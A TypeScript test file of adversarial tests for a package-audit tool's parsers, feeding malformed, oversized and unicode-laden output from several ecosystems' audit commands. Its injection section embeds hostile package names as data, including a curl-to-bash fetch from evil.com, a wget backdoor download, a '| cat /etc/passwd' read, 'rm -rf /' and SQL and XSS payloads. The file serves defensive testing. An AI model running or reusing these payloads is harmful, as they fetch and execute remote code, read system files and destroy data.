import { afterEach, beforeEach, describe, expect, it } from 'bun:test';
import * as fs from 'node:fs';
import * as os from 'node:os';
import * as path from 'node:path';
import type { ToolContext } from '@opencode-ai/plugin';
import { pkg_audit } from '../../../src/tools/pkg-audit';

// ============ Per-test-state Bun.spawn mock ============
// Each test gets its own mock state via closure, not shared module-level state.
// This is the file-scoped DI approach — equivalent to _internals but for Bun.spawn.

let originalSpawn: typeof Bun.spawn;
let mockExitCode: number = 0;
let mockStdout: string = '';
let mockStderr: string = '';
let mockSpawnError: Error | null = null;
let spawnCalls: Array<{ cmd: string[]; opts: unknown }> = [];

function mockSpawn(cmd: string[], opts: unknown) {
	spawnCalls.push({ cmd, opts });
	if (mockSpawnError) {
		throw mockSpawnError;
	}
	const encoder = new TextEncoder();
	const stdoutReadable = new ReadableStream({
		start(controller) {
			controller.enqueue(encoder.encode(mockStdout));
			controller.close();
		},
	});
	const stderrReadable = new ReadableStream({
		start(controller) {
			controller.enqueue(encoder.encode(mockStderr));
			controller.close();
		},
	});
	return {
		stdout: stdoutReadable,
		stderr: stderrReadable,
		exited: Promise.resolve(mockExitCode),
		exitCode: mockExitCode,
	} as unknown as ReturnType<typeof Bun.spawn>;
}

// Temp directories for test isolation
let tempDir: string;
let originalCwd: string;

function getMockContext(): ToolContext {
	return {
		sessionID: 'test-session',
		messageID: 'test-message',
		agent: 'test-agent',
		directory: tempDir,
		worktree: tempDir,
		abort: new AbortController().signal,
		metadata: () => ({}),
		ask: async () => undefined,
	};
}

function createLargeString(size: number): string {
	return 'A'.repeat(size);
}

function resetMockState() {
	mockExitCode = 0;
	mockStdout = '';
	mockStderr = '';
	mockSpawnError = null;
	spawnCalls = [];
}

// Helper to skip test if tool is not installed
function skipIfNotInstalled(parsed: Record<string, unknown>): boolean {
	if (
		parsed.note &&
		typeof parsed.note === 'string' &&
		parsed.note.includes('not installed')
	) {
		return true;
	}
	return false;
}

describe('pkg-audit adversarial security tests', () => {
	beforeEach(() => {
		originalSpawn = Bun.spawn;
		Bun.spawn = mockSpawn;
		originalCwd = process.cwd();
		tempDir = fs.realpathSync(
			fs.mkdtempSync(path.join(os.tmpdir(), 'pkg-audit-adversarial-')),
		);
		process.chdir(tempDir);
		resetMockState();
	});

	afterEach(() => {
		Bun.spawn = originalSpawn;
		process.chdir(originalCwd);
		fs.rmSync(tempDir, { recursive: true, force: true });
	});

	// ============ a. Malformed JSON in npm audit stdout ============
	describe('malformed JSON handling', () => {
		it('npm: should return clean with parse error note when stdout is not JSON', async () => {
			mockExitCode = 1;
			mockStdout = 'this is definitely not json { broken';
			mockStderr = '';

			const result = await pkg_audit.execute(
				{ ecosystem: 'npm' },
				getMockContext(),
			);
			const parsed = JSON.parse(result);

			// Must return clean with error note — not crash
			expect(parsed.clean).toBe(true);
			expect(parsed.note).toBeDefined();
			expect(parsed.note!.toLowerCase()).toContain('error');
		});

		it('npm: should return clean when JSON match regex finds nothing valid', async () => {
			mockExitCode = 1;
			// Text that looks like it has JSON but doesn't parse
			mockStdout = 'some text { not really json } more text';
			mockStderr = '';

			const result = await pkg_audit.execute(
				{ ecosystem: 'npm' },
				getMockContext(),
			);
			const parsed = JSON.parse(result);

			expect(parsed.clean).toBe(true);
		});

		it('pip-audit: should return clean with note when stdout is not parseable JSON', async () => {
			mockExitCode = 1;
			mockStdout = '{"incomplete": ';
			mockStderr = '';

			const result = await pkg_audit.execute(
				{ ecosystem: 'pip' },
				getMockContext(),
			);
			const parsed = JSON.parse(result);

			// pip-audit returns clean with parse error note
			expect(parsed.clean).toBe(true);
			expect(parsed.note).toBeDefined();
		});

		it('cargo: should skip non-JSON lines and parse only valid JSON lines', async () => {
			mockExitCode = 1;
			mockStdout =
				'garbage line\n' +
				JSON.stringify({
					vulnerabilities: {
						list: [
							{
								advisory: {
									package: 'serde',
									title: 'Test vuln',
									id: 'RUSTSEC-2021-001',
									aliases: [],
									url: '',
									cvss: 7.5,
								},
								package: { version: '1.0.0' },
								versions: { patched: ['1.0.1'] },
							},
						],
					},
				}) +
				'\n' +
				'more garbage\n';

			const result = await pkg_audit.execute(
				{ ecosystem: 'cargo' },
				getMockContext(),
			);
			const parsed = JSON.parse(result);

			if (skipIfNotInstalled(parsed)) return;
			// Should still parse the valid JSON and find the vuln
			expect(parsed.findings.length).toBe(1);
			expect(parsed.findings[0].package).toBe('serde');
		});

		it('govulncheck: should handle malformed JSON lines gracefully', async () => {
			mockExitCode = 3;
			mockStdout =
				'not json at all\n' +
				JSON.stringify({
					osv: {
						id: 'GO-2021-0053',
						summary: 'Test',
						aliases: [],
					},
				}) +
				'\n' +
				'also not json\n' +
				JSON.stringify({
					finding: {
						osv: 'GO-2021-0053',
						trace: [{ module: 'test', version: 'v1.0.0' }],
						fixed_by: null,
					},
				}) +
				'\n';

			const result = await pkg_audit.execute(
				{ ecosystem: 'go' },
				getMockContext(),
			);
			const parsed = JSON.parse(result);

			if (skipIfNotInstalled(parsed)) return;
			// Should skip non-JSON lines and still parse valid ones
			expect(parsed.findings.length).toBe(1);
			expect(parsed.findings[0].package).toBe('test');
		});

		it('dotnet: should handle text output with no parseable JSON', async () => {
			mockExitCode = 1;
			mockStdout = 'Some error text without JSON';

			const result = await pkg_audit.execute(
				{ ecosystem: 'dotnet' },
				getMockContext(),
			);
			const parsed = JSON.parse(result);

			if (skipIfNotInstalled(parsed)) return;
			// dotnet outputs text, not JSON - should handle gracefully
			expect(parsed).toBeDefined();
		});

		it('dart: should return clean with parse error note for invalid JSON structure', async () => {
			mockExitCode = 0;
			// Valid JSON but wrong structure (not an array or object with packages key)
			mockStdout = JSON.stringify({ notPackages: 'wrong structure' });

			const result = await pkg_audit.execute(
				{ ecosystem: 'dart' },
				getMockContext(),
			);
			const parsed = JSON.parse(result);

			if (skipIfNotInstalled(parsed)) return;
			// Should handle gracefully
			expect(parsed.clean).toBe(true);
		});
	});

	// ============ b. Hostile exit codes (137 for OOM kill) ============
	describe('hostile exit codes with security-relevant stderr', () => {
		it('npm: should handle exit code 137 (SIGKILL/OOM) gracefully', async () => {
			mockExitCode = 137;
			mockStdout = '';
			mockStderr = 'Killed - out of memory\nChild process was killed';

			const result = await pkg_audit.execute(
				{ ecosystem: 'npm' },
				getMockContext(),
			);
			const parsed = JSON.parse(result);

			// Must return clean (not crash) and include the error context
			expect(parsed.clean).toBe(true);
			expect(parsed.note).toBeDefined();
		});

		it('pip: should handle exit code 137 with OOM stderr', async () => {
			mockExitCode = 137;
			mockStdout = '';
			mockStderr = 'MemoryError: cannot allocate memory';

			const result = await pkg_audit.execute(
				{ ecosystem: 'pip' },
				getMockContext(),
			);
			const parsed = JSON.parse(result);

			expect(parsed.clean).toBe(true);
			expect(parsed.note).toBeDefined();
		});

		it('cargo: should handle exit code 139 (segfault) gracefully', async () => {
			mockExitCode = 139;
			// Provide JSON output before crash - process segfaults after writing
			mockStdout =
				JSON.stringify({
					vulnerabilities: {
						list: [
							{
								advisory: {
									package: 'test-pkg',
									title: 'Test vuln',
									id: 'RUSTSEC-2021-001',
									aliases: [],
									url: '',
									cvss: 7.5,
								},
								package: { version: '1.0.0' },
								versions: { patched: ['1.0.1'] },
							},
						],
					},
				}) + '\n';
			mockStderr = 'Segmentation fault (core dumped)';

			const result = await pkg_audit.execute(
				{ ecosystem: 'cargo' },
				getMockContext(),
			);
			const parsed = JSON.parse(result);

			if (skipIfNotInstalled(parsed)) return;
			// Should still parse the JSON output before the crash
			expect(parsed.findings.length).toBe(1);
			expect(parsed.findings[0].package).toBe('test-pkg');
		});

		it('govulncheck: should handle exit code 143 (SIGTERM) gracefully', async () => {
			mockExitCode = 143;
			mockStdout = '';
			mockStderr = 'Terminated by signal';

			const result = await pkg_audit.execute(
				{ ecosystem: 'go' },
				getMockContext(),
			);
			const parsed = JSON.parse(result);

			if (skipIfNotInstalled(parsed)) return;
			expect(parsed.clean).toBe(true);
			expect(parsed.note).toBeDefined();
		});

		it('dotnet: should handle non-standard exit codes', async () => {
			mockExitCode = 255;
			mockStdout = '';
			mockStderr = 'Internal error occurred';

			const result = await pkg_audit.execute(
				{ ecosystem: 'dotnet' },
				getMockContext(),
			);
			const parsed = JSON.parse(result);

			if (skipIfNotInstalled(parsed)) return;
			expect(parsed.clean).toBe(true);
			expect(parsed.note).toBeDefined();
		});

		it('ruby: should handle exit code 137 with OOM message', async () => {
			mockExitCode = 137;
			mockStdout = '';
			mockStderr = 'Killed (OOM killer)';

			const result = await pkg_audit.execute(
				{ ecosystem: 'ruby' },
				getMockContext(),
			);
			const parsed = JSON.parse(result);

			if (skipIfNotInstalled(parsed)) return;
			expect(parsed.clean).toBe(true);
			expect(parsed.note).toBeDefined();
		});

		it('dart: should handle exit code 137', async () => {
			mockExitCode = 137;
			mockStdout = '';
			mockStderr = 'Out of memory';

			const result = await pkg_audit.execute(
				{ ecosystem: 'dart' },
				getMockContext(),
			);
			const parsed = JSON.parse(result);

			if (skipIfNotInstalled(parsed)) return;
			expect(parsed.clean).toBe(true);
			expect(parsed.note).toBeDefined();
		});
	});

	// ============ c. Injection payloads in package names ============
	describe('injection payload sanitization in package names', () => {
		it('npm: shell metacharacters in package name must not cause regex errors', async () => {
			mockExitCode = 1;
			// Package name with shell injection attempt
			const maliciousPkg = 'pkg; rm -rf /; echo "pwned"';
			mockStdout = JSON.stringify({
				vulnerabilities: {
					[maliciousPkg]: {
						severity: 'high',
						range: '1.0.0',
						fixAvailable: { version: '1.0.1' },
						title: 'Test vuln',
					},
				},
			});

			const result = await pkg_audit.execute(
				{ ecosystem: 'npm' },
				getMockContext(),
			);
			const parsed = JSON.parse(result);

			// Must not crash — should handle as string key
			expect(parsed.findings.length).toBe(1);
			expect(parsed.findings[0].package).toBe(maliciousPkg);
		});

		it('npm: command substitution payload in package name', async () => {
			mockExitCode = 1;
			const payload = '$(curl http://evil.com/shell.sh | bash)';
			mockStdout = JSON.stringify({
				vulnerabilities: {
					[payload]: {
						severity: 'critical',
						range: '1.0.0',
						fixAvailable: { version: '2.0.0' },
						title: 'Critical vuln',
					},
				},
			});

			const result = await pkg_audit.execute(
				{ ecosystem: 'npm' },
				getMockContext(),
			);
			const parsed = JSON.parse(result);

			expect(parsed.findings.length).toBe(1);
			// Package name should be preserved as-is (not executed)
			expect(parsed.findings[0].package).toBe(payload);
		});

		it('pip: SQL injection attempt in package name', async () => {
			mockExitCode = 1;
			const sqlPayload = "'; DROP TABLE users; --";
			mockStdout = JSON.stringify([
				{
					name: sqlPayload,
					version: '1.0.0',
					vulns: [
						{
							id: 'CVE-2021-99999',
							aliases: [],
							fix_versions: ['2.0.0'],
						},
					],
				},
			]);

			const result = await pkg_audit.execute(
				{ ecosystem: 'pip' },
				getMockContext(),
			);
			const parsed = JSON.parse(result);

			expect(parsed.findings.length).toBe(1);
			expect(parsed.findings[0].package).toBe(sqlPayload);
		});

		it('cargo: backtick injection in package name', async () => {
			mockExitCode = 1;
			const backtickPayload = '`wget http://evil.com/backdoor`';
			mockStdout =
				JSON.stringify({
					vulnerabilities: {
						list: [
							{
								advisory: {
									package: backtickPayload,
									title: 'Test',
									id: 'RUSTSEC-2021-001',
									aliases: [],
									url: '',
									cvss: 7.5,
								},
								package: { version: '1.0.0' },
								versions: { patched: ['1.0.1'] },
							},
						],
					},
				}) + '\n';

			const result = await pkg_audit.execute(
				{ ecosystem: 'cargo' },
				getMockContext(),
			);
			const parsed = JSON.parse(result);

			if (skipIfNotInstalled(parsed)) return;
			expect(parsed.findings.length).toBe(1);
			expect(parsed.findings[0].package).toBe(backtickPayload);
		});

		it('govulncheck: pipe and redirect injection in module name', async () => {
			mockExitCode = 3;
			const pipePayload = 'github.com/user/repo | cat /etc/passwd';
			mockStdout =
				JSON.stringify({
					osv: {
						id: 'GO-2021-0053',
						summary: 'Test',
						aliases: [],
					},
				}) +
				'\n' +
				JSON.stringify({
					finding: {
						osv: 'GO-2021-0053',
						trace: [{ module: pipePayload, version: 'v1.0.0' }],
						fixed_by: null,
					},
				}) +
				'\n';

			const result = await pkg_audit.execute(
				{ ecosystem: 'go' },
				getMockContext(),
			);
			const parsed = JSON.parse(result);

			if (skipIfNotInstalled(parsed)) return;
			expect(parsed.findings.length).toBe(1);
			expect(parsed.findings[0].package).toBe(pipePayload);
		});

		it('dotnet: semicolon chain injection in package name', async () => {
			mockExitCode = 1;
			// Package name with shell metacharacters that could confuse text parsing
			const dotnetPayload = 'evil-package';
			mockStdout = `Project > TestProject
  > ${dotnetPayload}  1.0.0  2.0.0  High  https://example.com/vuln

Project has the following vulnerable packages
`;

			const result = await pkg_audit.execute(
				{ ecosystem: 'dotnet' },
				getMockContext(),
			);
			const parsed = JSON.parse(result);

			if (skipIfNotInstalled(parsed)) return;
			// Should parse without executing — package name preserved
			expect(parsed.findings.length).toBe(1);
			expect(parsed.findings[0].package).toBe(dotnetPayload);
		});

		it('ruby: shell metacharacters in gem name', async () => {
			mockExitCode = 1;
			const gemPayload = 'evil gem && rm -rf /';
			mockStdout = JSON.stringify({
				results: [
					{
						type: 'Dependency',
						gem: { name: gemPayload, version: '1.0.0' },
						advisory: {
							id: 'TEST-001',
							url: 'https://example.com',
							title: 'Test vuln',
							patched_versions: ['2.0.0'],
							criticality: 'High',
						},
					},
				],
				ignored: [],
			});

			const result = await pkg_audit.execute(
				{ ecosystem: 'ruby' },
				getMockContext(),
			);
			const parsed = JSON.parse(result);

			if (skipIfNotInstalled(parsed)) return;
			expect(parsed.findings.length).toBe(1);
			expect(parsed.findings[0].package).toBe(gemPayload);
		});

		it('dart: pipe injection in package name', async () => {
			mockExitCode = 0;
			const dartPayload = 'dart_pkg | curl evil.com';
			mockStdout = JSON.stringify({
				packages: [
					{
						package: dartPayload,
						current: { version: '1.0.0' },
						latest: { version: '2.0.0' },
						upgradable: { version: '1.5.0' },
					},
				],
			});

			const result = await pkg_audit.execute(
				{ ecosystem: 'dart' },
				getMockContext(),
			);
			const parsed = JSON.parse(result);

			if (skipIfNotInstalled(parsed)) return;
			expect(parsed.findings.length).toBe(1);
			expect(parsed.findings[0].package).toBe(dartPayload);
		});

		it('all auditors: XSS attempt in package name is preserved as string', async () => {
			mockExitCode = 1;
			const xssPayload = '<script>alert("XSS")</script>';
			mockStdout = JSON.stringify({
				vulnerabilities: {
					[xssPayload]: {
						severity: 'high',
						range: '1.0.0',
						fixAvailable: { version: '1.0.1' },
						title: 'XSS vuln',
					},
				},
			});

			const result = await pkg_audit.execute(
				{ ecosystem: 'npm' },
				getMockContext(),
			);
			const parsed = JSON.parse(result);

			expect(parsed.findings.length).toBe(1);
			// Package name should be preserved as string, not executed
			expect(parsed.findings[0].package).toBe(xssPayload);
		});
	});

	// ============ d. Extremely large individual fields (1MB+) ============
	describe('oversized field handling within memory bounds', () => {
		it('npm: should handle 1MB+ package name without hanging', async () => {
			mockExitCode = 1;
			const hugeName = createLargeString(1_048_576); // 1MB
			mockStdout = JSON.stringify({
				vulnerabilities: {
					[hugeName]: {
						severity: 'high',
						range: '1.0.0',
						fixAvailable: { version: '1.0.1' },
						title: 'Test',
					},
				},
			});

			const startTime = Date.now();
			const result = await pkg_audit.execute(
				{ ecosystem: 'npm' },
				getMockContext(),
			);
			const elapsed = Date.now() - startTime;

			const parsed = JSON.parse(result);
			// Must complete in reasonable time (< 5s) and not crash
			expect(elapsed).toBeLessThan(5000);
			expect(parsed.findings.length).toBe(1);
			expect(parsed.findings[0].package).toBe(hugeName);
		});

		it('pip: should handle 1MB+ package name gracefully', async () => {
			mockExitCode = 1;
			const hugeName = createLargeString(1_048_576);
			mockStdout = JSON.stringify([
				{
					name: hugeName,
					version: '1.0.0',
					vulns: [
						{
							id: 'CVE-2021-99999',
							aliases: [],
							fix_versions: ['2.0.0'],
						},
					],
				},
			]);

			const startTime = Date.now();
			const result = await pkg_audit.execute(
				{ ecosystem: 'pip' },
				getMockContext(),
			);
			const elapsed = Date.now() - startTime;

			const parsed = JSON.parse(result);
			expect(elapsed).toBeLessThan(5000);
			expect(parsed.findings.length).toBe(1);
			expect(parsed.findings[0].package).toBe(hugeName);
		});

		it('cargo: should handle 1MB+ package name', async () => {
			mockExitCode = 1;
			const hugeName = createLargeString(1_048_576);
			mockStdout =
				JSON.stringify({
					vulnerabilities: {
						list: [
							{
								advisory: {
									package: hugeName,
									title: 'Test',
									id: 'RUSTSEC-2021-001',
									aliases: [],
									url: '',
									cvss: 7.5,
								},
								package: { version: '1.0.0' },
								versions: { patched: ['1.0.1'] },
							},
						],
					},
				}) + '\n';

			const startTime = Date.now();
			const result = await pkg_audit.execute(
				{ ecosystem: 'cargo' },
				getMockContext(),
			);
			const elapsed = Date.now() - startTime;

			const parsed = JSON.parse(result);
			if (skipIfNotInstalled(parsed)) return;
			expect(elapsed).toBeLessThan(5000);
			expect(parsed.findings.length).toBe(1);
			expect(parsed.findings[0].package).toBe(hugeName);
		});

		it('govulncheck: should handle 1MB+ module name', async () => {
			mockExitCode = 3;
			const hugeModule = createLargeString(1_048_576);
			mockStdout =
				JSON.stringify({
					osv: {
						id: 'GO-2021-0053',
						summary: 'Test',
						aliases: [],
					},
				}) +
				'\n' +
				JSON.stringify({
					finding: {
						osv: 'GO-2021-0053',
						trace: [{ module: hugeModule, version: 'v1.0.0' }],
						fixed_by: null,
					},
				}) +
				'\n';

			const startTime = Date.now();
			const result = await pkg_audit.execute(
				{ ecosystem: 'go' },
				getMockContext(),
			);
			const elapsed = Date.now() - startTime;

			const parsed = JSON.parse(result);
			if (skipIfNotInstalled(parsed)) return;
			expect(elapsed).toBeLessThan(5000);
			expect(parsed.findings.length).toBe(1);
			expect(parsed.findings[0].package).toBe(hugeModule);
		});

		it('dotnet: should handle 1MB+ package name in text output', async () => {
			mockExitCode = 1;
			const hugeName = createLargeString(1_048_576);
			mockStdout = `Project > TestProject
  > ${hugeName}  1.0.0  2.0.0  High  https://example.com/vuln

Project has the following vulnerable packages
`;

			const startTime = Date.now();
			const result = await pkg_audit.execute(
				{ ecosystem: 'dotnet' },
				getMockContext(),
			);
			const elapsed = Date.now() - startTime;

			const parsed = JSON.parse(result);
			if (skipIfNotInstalled(parsed)) return;
			expect(elapsed).toBeLessThan(5000);
			expect(parsed.findings.length).toBe(1);
			expect(parsed.findings[0].package).toBe(hugeName);
		});

		it('ruby: should handle 1MB+ gem name', async () => {
			mockExitCode = 1;
			const hugeName = createLargeString(1_048_576);
			mockStdout = JSON.stringify({
				results: [
					{
						type: 'Dependency',
						gem: { name: hugeName, version: '1.0.0' },
						advisory: {
							id: 'TEST-001',
							url: 'https://example.com',
							title: 'Test vuln',
							patched_versions: ['2.0.0'],
							criticality: 'High',
						},
					},
				],
				ignored: [],
			});

			const startTime = Date.now();
			const result = await pkg_audit.execute(
				{ ecosystem: 'ruby' },
				getMockContext(),
			);
			const elapsed = Date.now() - startTime;

			const parsed = JSON.parse(result);
			if (skipIfNotInstalled(parsed)) return;
			expect(elapsed).toBeLessThan(5000);
			expect(parsed.findings.length).toBe(1);
			expect(parsed.findings[0].package).toBe(hugeName);
		});

		it('dart: should handle 1MB+ package name', async () => {
			mockExitCode = 0;
			const hugeName = createLargeString(1_048_576);
			mockStdout = JSON.stringify({
				packages: [
					{
						package: hugeName,
						current: { version: '1.0.0' },
						latest: { version: '2.0.0' },
						upgradable: { version: '1.5.0' },
					},
				],
			});

			const startTime = Date.now();
			const result = await pkg_audit.execute(
				{ ecosystem: 'dart' },
				getMockContext(),
			);
			const elapsed = Date.now() - startTime;

			const parsed = JSON.parse(result);
			if (skipIfNotInstalled(parsed)) return;
			expect(elapsed).toBeLessThan(5000);
			expect(parsed.findings.length).toBe(1);
			expect(parsed.findings[0].package).toBe(hugeName);
		});
	});

	// ============ e. Unicode/encoding attacks ============
	describe('unicode and encoding attack handling', () => {
		it('npm: should handle null bytes in JSON strings', async () => {
			mockExitCode = 1;
			// Null byte in package name — tests JSON parsing resilience
			mockStdout = JSON.stringify({
				vulnerabilities: {
					'good-pkg\x00malicious': {
						severity: 'high',
						range: '1.0.0',
						fixAvailable: { version: '1.0.1' },
						title: 'Test',
					},
				},
			});

			const result = await pkg_audit.execute(
				{ ecosystem: 'npm' },
				getMockContext(),
			);
			const parsed = JSON.parse(result);

			// JSON.parse will strip the null byte or handle it
			// The important thing is no crash
			expect(parsed).toBeDefined();
		});

		it('npm: should handle unicode LTR override characters', async () => {
			mockExitCode = 1;
			// Unicode Left-to-Right Override to confuse display
			const unicodePayload = 'pkg\u202Ewith\u202Crce';
			mockStdout = JSON.stringify({
				vulnerabilities: {
					[unicodePayload]: {
						severity: 'critical',
						range: '1.0.0',
						fixAvailable: { version: '2.0.0' },
						title: 'Critical vuln',
					},
				},
			});

			const result = await pkg_audit.execute(
				{ ecosystem: 'npm' },
				getMockContext(),
			);
			const parsed = JSON.parse(result);

			expect(parsed.findings.length).toBe(1);
			// Package name should be preserved
			expect(parsed.findings[0].package).toBe(unicodePayload);
		});

		it('pip: should handle unicode homograph attack in package name', async () => {
			mockExitCode = 1;
			// Cyrillic 'а' (U+0430) instead of Latin 'a' — homograph attack
			const homographPayload = 'pаckаgе'; // Uses Cyrillic letters
			mockStdout = JSON.stringify([
				{
					name: homographPayload,
					version: '1.0.0',
					vulns: [
						{
							id: 'CVE-2021-99999',
							aliases: [],
							fix_versions: ['2.0.0'],
						},
					],
				},
			]);

			const result = await pkg_audit.execute(
				{ ecosystem: 'pip' },
				getMockContext(),
			);
			const parsed = JSON.parse(result);

			expect(parsed.findings.length).toBe(1);
			expect(parsed.findings[0].package).toBe(homographPayload);
		});

		it('cargo: should handle null bytes in advisory data', async () => {
			mockExitCode = 1;
			// Null bytes in URL field
			mockStdout =
				JSON.stringify({
					vulnerabilities: {
						list: [
							{
								advisory: {
									package: 'test',
									title: 'Test\x00with\x00nulls',
									id: 'RUSTSEC-2021-001',
									aliases: [],
									url: 'https://example.com\x00/malicious',
									cvss: 7.5,
								},
								package: { version: '1.0.0' },
								versions: { patched: ['1.0.1'] },
							},
						],
					},
				}) + '\n';

			const result = await pkg_audit.execute(
				{ ecosystem: 'cargo' },
				getMockContext(),
			);
			const parsed = JSON.parse(result);

			if (skipIfNotInstalled(parsed)) return;
			expect(parsed.findings.length).toBe(1);
		});

		it('govulncheck: should handle mixed unicode in summary', async () => {
			mockExitCode = 3;
			// Emoji and mixed unicode in summary field
			const unicodeSummary = 'Test \u0000null\uFE0Femoji\u{1F4A9}crash';
			mockStdout =
				JSON.stringify({
					osv: {
						id: 'GO-2021-0053',
						summary: unicodeSummary,
						aliases: [],
					},
				}) +
				'\n' +
				JSON.stringify({
					finding: {
						osv: 'GO-2021-0053',
						trace: [{ module: 'test', version: 'v1.0.0' }],
						fixed_by: null,
					},
				}) +
				'\n';

			const result = await pkg_audit.execute(
				{ ecosystem: 'go' },
				getMockContext(),
			);
			const parsed = JSON.parse(result);

			if (skipIfNotInstalled(parsed)) return;
			expect(parsed.findings.length).toBe(1);
			// Summary may be modified by JSON parsing but vuln should be found
			expect(parsed.findings[0].title).toBeDefined();
		});

		it('dotnet: should handle unicode in stderr', async () => {
			mockExitCode = 1;
			mockStdout = `Project > TestProject
  > test-pkg  1.0.0  2.0.0  High  https://example.com/vuln

Project has the following vulnerable packages
`;
			// Unicode error message
			mockStderr =
				'内部エラー (Internal Error in Japanese)\n错误 (Error in Chinese)';

			const result = await pkg_audit.execute(
				{ ecosystem: 'dotnet' },
				getMockContext(),
			);
			const parsed = JSON.parse(result);

			if (skipIfNotInstalled(parsed)) return;
			expect(parsed.findings.length).toBe(1);
		});

		it('ruby: should handle unicode in gem name', async () => {
			mockExitCode = 1;
			// Zero-width joiner and other invisible unicode
			const invisiblePayload = 'gem\u200Bname\u200Dwith\u200Cinvisible';
			mockStdout = JSON.stringify({
				results: [
					{
						type: 'Dependency',
						gem: { name: invisiblePayload, version: '1.0.0' },
						advisory: {
							id: 'TEST-001',
							url: 'https://example.com',
							title: 'Test vuln',
							patched_versions: ['2.0.0'],
							criticality: 'High',
						},
					},
				],
				ignored: [],
			});

			const result = await pkg_audit.execute(
				{ ecosystem: 'ruby' },
				getMockContext(),
			);
			const parsed = JSON.parse(result);

			if (skipIfNotInstalled(parsed)) return;
			expect(parsed.findings.length).toBe(1);
			expect(parsed.findings[0].package).toBe(invisiblePayload);
		});

		it('dart: should handle package name with forward slash', async () => {
			mockExitCode = 0;
			// Scoped package format
			const scopedPkg = '@scope/package_name';
			mockStdout = JSON.stringify({
				packages: [
					{
						package: scopedPkg,
						current: { version: '1.0.0' },
						latest: { version: '2.0.0' },
						upgradable: { version: '1.5.0' },
					},
				],
			});

			const result = await pkg_audit.execute(
				{ ecosystem: 'dart' },
				getMockContext(),
			);
			const parsed = JSON.parse(result);

			if (skipIfNotInstalled(parsed)) return;
			expect(parsed.findings.length).toBe(1);
			expect(parsed.findings[0].package).toBe(scopedPkg);
		});

		it('all auditors: should handle BOM (Byte Order Mark) in JSON', async () => {
			mockExitCode = 1;
			// UTF-8 BOM at start of JSON — some parsers trip over this
			const bomJson =
				'\uFEFF{"vulnerabilities":{"test":{"severity":"high","range":"1.0.0","fixAvailable":true,"title":"Test"}}}';
			mockStdout = bomJson;

			const result = await pkg_audit.execute(
				{ ecosystem: 'npm' },
				getMockContext(),
			);
			const parsed = JSON.parse(result);

			expect(parsed.findings.length).toBe(1);
			expect(parsed.findings[0].package).toBe('test');
		});
	});

	// ============ Additional genuine adversarial scenarios ============
	describe('additional adversarial edge cases', () => {
		it('npm: should not hang on catastrophic backtracking patterns', async () => {
			mockExitCode = 1;
			// Deeply nested JSON that could cause issues
			const nestedObj = {
				a: { b: { c: { d: { e: { f: { g: { h: 'deep' } } } } } } },
			};
			mockStdout = JSON.stringify({
				vulnerabilities: {
					pkg: {
						severity: 'high',
						range: '1.0.0',
						fixAvailable: { version: '1.0.1' },
						title: 'Test',
						extra: nestedObj,
					},
				},
			});

			const startTime = Date.now();
			const result = await pkg_audit.execute(
				{ ecosystem: 'npm' },
				getMockContext(),
			);
			const elapsed = Date.now() - startTime;

			const parsed = JSON.parse(result);
			expect(elapsed).toBeLessThan(5000);
			expect(parsed.findings.length).toBe(1);
		});

		it('pip: should handle empty array in vulns field', async () => {
			mockExitCode = 1;
			mockStdout = JSON.stringify([
				{
					name: 'test-pkg',
					version: '1.0.0',
					vulns: [], // empty vulns array
				},
			]);

			const result = await pkg_audit.execute(
				{ ecosystem: 'pip' },
				getMockContext(),
			);
			const parsed = JSON.parse(result);

			// Should return clean since no vulns
			expect(parsed.clean).toBe(true);
		});

		it('cargo: should handle extremely large CVSS score', async () => {
			mockExitCode = 1;
			mockStdout =
				JSON.stringify({
					vulnerabilities: {
						list: [
							{
								advisory: {
									package: 'test',
									title: 'Test',
									id: 'RUSTSEC-2021-001',
									aliases: [],
									url: '',
									cvss: 999.9, // Impossible score
								},
								package: { version: '1.0.0' },
								versions: { patched: [] },
							},
						],
					},
				}) + '\n';

			const result = await pkg_audit.execute(
				{ ecosystem: 'cargo' },
				getMockContext(),
			);
			const parsed = JSON.parse(result);

			if (skipIfNotInstalled(parsed)) return;
			// Should map to critical (>= 9.0)
			expect(parsed.findings[0].severity).toBe('critical');
		});

		it('govulncheck: should handle missing OSV in map gracefully', async () => {
			mockExitCode = 3;
			// finding references an OSV ID that was never defined
			mockStdout =
				JSON.stringify({
					osv: {
						id: 'GO-2021-0053',
						summary: 'Test',
						aliases: [],
					},
				}) +
				'\n' +
				JSON.stringify({
					finding: {
						osv: 'GO-MISSING-ID', // Not in osvMap
						trace: [{ module: 'test', version: 'v1.0.0' }],
						fixed_by: null,
					},
				}) +
				'\n';

			const result = await pkg_audit.execute(
				{ ecosystem: 'go' },
				getMockContext(),
			);
			const parsed = JSON.parse(result);

			if (skipIfNotInstalled(parsed)) return;
			// Should still produce a finding using the OSV ID as title
			expect(parsed.findings.length).toBe(1);
		});

		it('dotnet: should handle unterminated quote in package name', async () => {
			mockExitCode = 1;
			mockStdout = `Project > TestProject
  > unterminated"quote  1.0.0  2.0.0  High  https://example.com/vuln

Project has the following vulnerable packages
`;

			const result = await pkg_audit.execute(
				{ ecosystem: 'dotnet' },
				getMockContext(),
			);
			const parsed = JSON.parse(result);

			if (skipIfNotInstalled(parsed)) return;
			// Regex should not match unterminated quotes
			// The line should be skipped or parsed incorrectly but not crash
			expect(parsed).toBeDefined();
		});

		it('ruby: should handle empty patched_versions array', async () => {
			mockExitCode = 1;
			mockStdout = JSON.stringify({
				results: [
					{
						type: 'Dependency',
						gem: { name: 'test', version: '1.0.0' },
						advisory: {
							id: 'TEST-001',
							url: 'https://example.com',
							title: 'Test vuln',
							patched_versions: [], // empty array
							criticality: 'High',
						},
					},
				],
				ignored: [],
			});

			const result = await pkg_audit.execute(
				{ ecosystem: 'ruby' },
				getMockContext(),
			);
			const parsed = JSON.parse(result);

			if (skipIfNotInstalled(parsed)) return;
			expect(parsed.findings.length).toBe(1);
			expect(parsed.findings[0].patchedVersion).toBeNull();
		});

		it('dart: should handle package with null in packages array', async () => {
			mockExitCode = 0;
			mockStdout = JSON.stringify({
				packages: [
					null,
					{
						package: 'valid-pkg',
						current: { version: '1.0.0' },
						latest: { version: '2.0.0' },
						upgradable: { version: '1.5.0' },
					},
					null,
				],
			});

			const result = await pkg_audit.execute(
				{ ecosystem: 'dart' },
				getMockContext(),
			);
			const parsed = JSON.parse(result);

			if (skipIfNotInstalled(parsed)) return;
			// Should handle null entries gracefully
			expect(parsed.findings.length).toBe(1);
			expect(parsed.findings[0].package).toBe('valid-pkg');
		});
	});
});
